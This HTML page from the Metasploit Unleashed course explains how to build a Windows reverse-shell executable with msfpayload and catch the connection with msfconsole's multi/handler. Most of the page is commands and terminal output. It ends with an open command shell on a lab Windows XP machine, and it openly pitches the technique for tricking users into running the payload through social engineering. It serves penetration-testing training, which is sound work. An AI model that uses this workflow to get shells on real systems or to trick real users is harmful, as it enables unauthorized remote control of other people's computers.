<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Binary Payloads</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Binary
Payloads</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">It seems like Metasploit is full of
interesting and useful features.
One of these is the ability to generate an executable from a Metasploit
payload. This can be very useful in situations such as social
engineering, if you can get a user to run your payload for you, there
is no reason to go through the trouble of exploiting any software.
</p>
<p style="color: rgb(0, 0, 0);">Let's look at a quick example of how to
do this. We will
generate a reverse shell payload, execute it on a remote system, and
get our shell. To do this we will use the command line tool msfpayload.
This command can be used for generating payloads to be used in many
locations and offers a variety of output options, from perl to C to
raw. We are interested in the executable output, which is provided by
the X command.
</p>
<p style="color: rgb(0, 0, 0);">We'll generate a Windows reverse shell
executable that will
connect back to us on port 31337. Notice that msfpayload operates the
same way as msfcli in that you can append the letter 'O' to the end of
the command string to see which options are available to you.
<br>
<br>
</p>
<pre id="code">root@bt4:/pentest/exploits/framework3# ./msfpayload windows/shell_reverse_tcp O<br><br>       Name: Windows Command Shell, Reverse TCP Inline<br>    Version: 6479<br>   Platform: Windows<br>       Arch: x86<br>Needs Admin: No<br> Total size: 287<br><br>Provided by:<br>  vlad902 vlad902@gmail.com<br><br>Basic options:<br>Name       Current Setting  Required  Description<br>----       ---------------  --------  -----------<br>EXITFUNC   seh              yes       Exit technique: seh, thread, process<br>LHOST                       yes       The local address<br>LPORT      4444             yes       The local port<br><br>Description:<br>Connect back to attacker and spawn a command shell<br><br>root@bt4:/pentest/exploits/framework3# ./msfpayload windows/shell_reverse_tcp LHOST=172.16.104.130 LPORT=31337 O<br><br>Name: Windows Command Shell, Reverse TCP Inline<br>Version: 6479<br>Platform: Windows<br>Arch: x86<br>Needs Admin: No<br>Total size: 287<br><br>Provided by:<br>vlad902 vlad902@gmail.com<br><br>Basic options:<br>Name       Current Setting  Required  Description<br>----       ---------------  --------  -----------<br>EXITFUNC   seh              yes       Exit technique: seh, thread, process<br>LHOST      172.16.104.130   yes       The local address<br>LPORT      31337            yes       The local port<br><br>Description:<br>Connect back to attacker and spawn a command shell<br><br>root@bt4:/pentest/exploits/framework3# ./msfpayload windows/shell_reverse_tcp LHOST=172.16.104.130 LPORT=31337 X &gt; /tmp/1.exe<br><br>Created by msfpayload (http://www.metasploit.com).<br>Payload: windows/shell_reverse_tcp<br>Length: 287<br>Options: LHOST=172.16.104.130,LPORT=31337<br><br>root@bt:/pentest/exploits/framework3# file /tmp/1.exe<br><br>/tmp/1.exe: MS-DOS executable PE for MS Windows (GUI) Intel 80386 32-bit</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Ok, now we see we have a windows
executable ready to go. Now, we
will use 'multi/handler' which is a stub that handles exploits launched
outside of the framework.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/pentest/exploits/framework3# ./msfconsole<br><br>                ##                          ###           ##    ##<br> ##  ##  #### ###### ####  #####   #####    ##    ####        ######<br>####### ##  ##  ##  ##         ## ##  ##    ##   ##  ##   ###   ##<br>####### ######  ##  #####   ####  ##  ##    ##   ##  ##   ##    ##<br>## # ##     ##  ##  ##  ## ##      #####    ##   ##  ##   ##    ##<br>##   ##  #### ###   #####   #####     ##   ####   ####   #### ###<br>                                      ##<br><br><br>       =[ metasploit v3.3-rc1 [core:3.3 api:1.0]<br>+ -- --=[ 371 exploits - 234 payloads<br>+ -- --=[ 20 encoders - 7 nops<br>       =[ 149 aux<br><br>msf &gt; use exploit/multi/handler<br>msf exploit(handler) &gt; show options<br><br>Module options:<br><br>   Name  Current Setting  Required  Description <br>   ----  ---------------  --------  ----------- <br><br><br>Exploit target:<br><br>   Id  Name            <br>   --  ----            <br>   0   Wildcard Target</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">When using the
'exploit/multi/handler' module, we still need to
tell it which payload to expect so we configure it to have the same
settings as the executable we generated.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf exploit(handler) &gt; set payload windows/shell/reverse_tcp<br>payload =&gt; windows/shell/reverse_tcp<br>msf exploit(handler) &gt; show options<br><br>Module options:<br><br>   Name  Current Setting  Required  Description<br>   ----  ---------------  --------  -----------<br><br><br>Payload options (windows/shell/reverse_tcp):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   EXITFUNC  thread           yes       Exit technique: seh, thread, process<br>   LHOST                      yes       The local address<br>   LPORT     4444             yes       The local port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Wildcard Target <br><br><br>msf exploit(handler) &gt; set LHOST 172.16.104.130<br>LHOST =&gt; 172.16.104.130<br>msf exploit(handler) &gt; set LPORT 31337<br>LPORT =&gt; 31337<br>msf exploit(handler) &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now that we have everything set up
and ready to go, we run
'exploit' for the multi/handler and execute our generated executable on
the victim. The multi/handler handles the exploit for us and presents
us our shell.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf exploit(handler) &gt; exploit<br><br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Starting the payload handler...<br>[*] Sending stage (474 bytes)<br>[*] Command shell session 2 opened (172.16.104.130:31337 -&gt; 172.16.104.128:1150)<br><br>Microsoft Windows XP [Version 5.1.2600]<br>(C) Copyright 1985-2001 Microsoft Corp.<br><br>C:\Documents and Settings\Jim\My Documents&gt;</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Client_Side_Exploits"
 title="Client Side Exploits">Client-Side Exploits</a></div>
</body>
</html>
